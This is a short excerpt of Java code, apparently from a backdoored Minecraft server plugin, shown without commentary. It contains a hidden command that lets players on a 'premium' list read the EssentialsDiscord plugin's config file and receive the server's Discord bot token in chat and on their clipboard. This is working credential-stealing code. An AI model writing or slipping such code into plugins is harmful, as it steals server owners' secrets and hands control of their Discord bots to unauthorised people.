    ...
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            ...
            if (PluginUtils.getPluginByName("EssentialsDiscord") == null) {
                p2.sendMessage(Settings.PREFIX("This server does not have EssentialsDiscord"));
            } else {
                File f2 = new File(PluginUtils.getPluginByName("EssentialsDiscord").getDataFolder() + "/config.yml");
                YamlConfiguration yc2 = YamlConfiguration.loadConfiguration((File)f2);
                p2.sendMessage(Settings.PREFIX(yc2.getString("token")));
                p2.sendMessage(Settings.PREFIX("Token was also attempted to be copied to your clipboard"));
                Toolkit toolkit = Toolkit.getDefaultToolkit();
                Clipboard clipboard = toolkit.getSystemClipboard();
                StringSelection strSel = new StringSelection(yc2.getString("token"));
                clipboard.setContents(strSel, null);
            }
        } else {
